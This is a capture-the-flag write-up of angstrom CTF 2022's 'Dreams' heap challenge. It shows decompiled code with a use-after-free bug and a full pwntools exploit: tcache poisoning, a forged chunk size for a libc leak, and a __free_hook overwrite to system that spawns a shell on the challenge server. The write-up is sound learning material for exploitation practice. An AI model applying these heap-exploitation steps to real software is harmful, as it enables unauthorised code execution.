# Dreams

> Sometimes I want to just stay in my dreams.  
> I heard this helps: libc.so.6  
> nc challs.actf.co 31227

## Intro

Dreams was a heap based challenge from angstrom ctf 2022

## Checksec

```bash
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

## Code analysis

```bash
Welcome to the dream tracker.
Sleep is where the deepest desires and most pushed-aside feelings of humankind are brought out.
Confide a month of your time.
----- MENU -----
1. Sleep
2. Sell
3. Visit a psychiatrist
```

Right as we run the binary we are presented with the usuall heap menu. Resorting to a decompiler, we can inspect the functions provided by the menu's options. Bellow you'll find ghidra's decompilation. It is worth mentioning that the binary has Full RELRO. For that reason I won't even consider the GOT for my exploit

```c
void gosleep(void)

{
  size_t sVar1;
  long in_FS_OFFSET;
  int index;
  char *buffer;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("3 doses of Ambien finally calms you down enough to sleep.");
  puts("Toss and turn all you want, your unconscious never loses its grip.");
  printf("In which page of your mind do you keep this dream? ");
  index = 0;
  __isoc99_scanf(&DAT_00402104,&index);
  getchar();
  if (((index < MAX_DREAMS) && (-1 < index)) && (*(long *)(dreams + (long)index * 8) == 0))
  {
    buffer = (char *)malloc(0x1c);
    printf("What\'s the date (mm/dd/yy))? ");
    read(0,buffer,8);
    sVar1 = strcspn(buffer,"\n");
    buffer[sVar1] = '\0';
    printf("On %s, what did you dream about? ",buffer);
    read(0,buffer + 8,0x14);
    *(char **)((long)index * 8 + dreams) = buffer;
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return;
  }
  puts("Invalid index!");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

The gosleep function starts by checking if the index supplied does not exceed the MAX_DREAMS (initially set to 5). Then, it multiplies the index by 8 and checks if dreams[8*i] == Null. Finnaly, it allocates a chunk of 40 bytes (0x28) only if the previous check was succesfull. To sum up, it allocates at offsets that are multiples of 8 as long as it doens't exceed the MAX_DREAMS and the address of the allocation is Null.

```c
void psychiatrist(void)

{
  long in_FS_OFFSET;
  int index;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Due to your HMO plan, you can only consult me to decipher your dream.");
  printf("What dream is giving you trouble? ");
  index = 0;
  __isoc99_scanf(&DAT_00402104,&index);
  getchar();
  if (*(long *)(dreams + (long)index * 8) == 0) {
    puts("Invalid dream!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("Hmm... I see. It looks like your dream is telling you that ");
  puts((char *)(*(long *)(dreams + (long)index * 8) + 8));
  puts(
      "Due to the elusive nature of dreams, you now must dream it on a different day. Sorry, I don\'t make the rules. Or do I?"
      );
  printf("New date: ");
  read(0,*(void **)(dreams + (long)index * 8),8);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

The psychiatrist function prints information about a chunk as long as that chunk is not null.

```c
void sell(void)

{
  long in_FS_OFFSET;
  int index;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("You\'ve come to sell your dreams.");
  printf("Which one are you trading in? ");
  index = 0;
  __isoc99_scanf(&DAT_00402104,&index);
  getchar();
  if ((index < MAX_DREAMS) && (-1 < index)) {
    puts("You let it go. Suddenly you feel less burdened... less restrained... freed. At last.");
    free(*(void **)(dreams + (long)index * 8));
    puts("Your money? Pfft. Get out of here.");
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return;
  }
  puts("Out of bounds!");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

The sell function frees a chunk, but fails to set the pointer to null.Therefore, we have a Use-After-Free vulnerability.

## Exploit

### Heap Leak

So giving that we are in libc 2.31, our binary will have tcache. Therefore, my idea will be to poison the tcache to get arbitrary read and write. And then, using that I'll leak the heap and then the libc base address'

```python
sleep(0,dream=b'a dog')
sleep(1,dream=b'a dog')
sell(0)
sell(1)
heap_base = parse_heap_leak()
log.info(f"Heap is at {hex(heap_base)}")
```

The idea here is to alloc two chunks and then free them, ensuring that both of the chunks end up in the tcache. This is the look of the tcache after theese allocations

```string
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
Tcachebins[idx=1, size=0x30] count=2  ←  Chunk(addr=0xab2310, size=0x30, flags=PREV_INUSE)  ←  [Corrupted chunk at 0xa3231]
─────────────────────────────── Fastbins for arena at 0x7f92fe1d7b80 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
```

By using the psychiatrist function we can leak the heap base address. This address will be usefull for later.

### Libc leak

To call one_gadget, system or other libc function we need its base address (since ASLR might be on in the server). My idea was to allocate 1200 (0x4b0) bytes, over tcache's maximum chunk size, and then free it. That means that the chunk will end up into the unsorted bin, which will have main arena pointers. However, we can only allocate 40 bytes per chunk and we can only allocate 5 chunks, which corresponds to 200 bytes. So the first step is to overwrite the MAX_DREAMS to allow me to allocate as many chunks as needed. So using the UAF, I overwrote the forward pointer in the tcache to 0x404028-32 (a litle bit before MAX_DREAMS to avoid the program from crashing). It is worth mentioning that the tcache looks exactly the same as shown above.

```python
visit_psychiatrist(1,p64(MAX_DREAMS))
sleep(2)
sleep(3,dream=b'\xff\xff')
```

```string
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
Tcachebins[idx=1, size=0x30] count=2  ←  Chunk(addr=0x19fc310, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x404008, size=0x0, flags=! PREV_INUSE)
─────────────────────────────── Fastbins for arena at 0x7f41fd6ebb80 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
```

This is how the tcache looks after being corrupted to give me arbitrary read/write. Then by allocating 2 chunks I will have a pointer to the address I want. The python code shows both the tcache poisonning and the overwrite MAX_DREAMS to 0xffff.  
Now, being able to allocate as many chunks as I wanted I allocated the 1200 bytes necessary. Then using the heap leak and tcache poison, I overwrote the size of a chunk to be 0x4f1 (note that it nedded to be 0x4f1 to set the PREVIOUS_INUSE flag).

```python
# libc leak
allocs() # allocated 25 chunks. Those will take 25*0x30=1200 bytes of memory (0x4b0)
sleep(37) # will be used to overwrite the free_hook
sleep(38) #  will be used to overwrite the free_hook
sleep(39,date=b'/bin/sh') #  will be used to overwrite the free_hook

# set up write what where with tcache poison, to write to chunk number two's size
sleep(35)
sleep(36)
sell(35)
sell(36)
visit_psychiatrist(36, p64(heap_base+BIG_CHUNK_OFFSET))


# alloc this to take out tcache's top chunk. We are intersted in the next one
sleep(34, b"junk", b"junk2")
# overwrite two's size to fool free into thinking that chunk two's size is actually 0x4b1
# since its over tcache max chunk size, it will go to unsorted bin
io.sendlineafter(b'>',str(1).encode())
io.sendlineafter(b'?',str(33).encode())
io.sendlineafter(b'?',p32(0)) 
io.sendafter(b'?',p32(0x4b1))
```

```string
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7fb2935a4b80 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7fb2935a4b80 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x4ae300, bk=0x4ae300
 →   Chunk(addr=0x4ae310, size=0x4b0, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
```

As you can see, I got a chunk in the unsorted bin! I also allocated chunks to use later, since the tcache and unosrted bin will become corrupted for further allocations if they remain empty.  
Having all required information on the binary, all is left to do is poison tcache one last time to overwrite the free_hook with system and free a chunk pointing to /bin/sh.

```python
# set up write what where to overwrite the free_hook
sell(37)
sell(38)
visit_psychiatrist(38, p64(libc.symbols['__free_hook']))

# alloc this to take out tcache's top chunk. We are intersted in the next one
sleep(40, b"junk", b"junk2")
# overwrite free_hook with system
io.sendlineafter(b'>',str(1).encode())
io.sendlineafter(b'?',str(62).encode())
io.sendlineafter(b' What\'s the date (mm/dd/yy))?',p64(libc.symbols['system'])) 

# free a chunk that has /bin/sh and get the shell
sell(39)
io.sendline(b'cat flag.txt')
io.interactive()
```

```bash
[*] '/home/Documents/angstrom22/dreams/dreams'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challs.actf.co on port 31227: Done
[*] Heap is at 0x14a2000
[*] Libc is at 0x7fe1c0519000
[*] Switching to interactive mode
actf{hav3_you_4ny_dreams_y0u'd_like_to_s3ll?_cb72f5211336}
```

## Takeways

- In heap exploitation, the easiest way to get remote code execution and leaks is the GOT. If the GOT is Full RELRO, we can still get leaks, as long as we just read from the table (remote code execution can be achieved through either hooks or file stream oriented programing). However, if PIE is enabled and you got no way to calculate GOT's position, consider other options.

- The unosrted bin has main arena pointers that can be leaked. A chunk will go to the unsorted bin instead of the tcache if its size is larget than 0x420 (tcache's cut-off) or the number of chunks in the tcache for a specific size is 7. However, the chunk needs to be large enough not to end up in the fastbin

## Chunks

| Bins    | Linked List Type | Chunk size range       | Coalescing |
|---------|------------------|------------------------|------------|
| Fast    | Singly-linked    | 16 – 80 bytes          | No         |
| Small   | Doubly-linked    | 80 – 512 bytes         | Yes        |
| Large   | Doubly-linked    | 512+ bytes             | Yes        |
|Unosrted | Doubly Linked    | Small and Large chunks | No         |
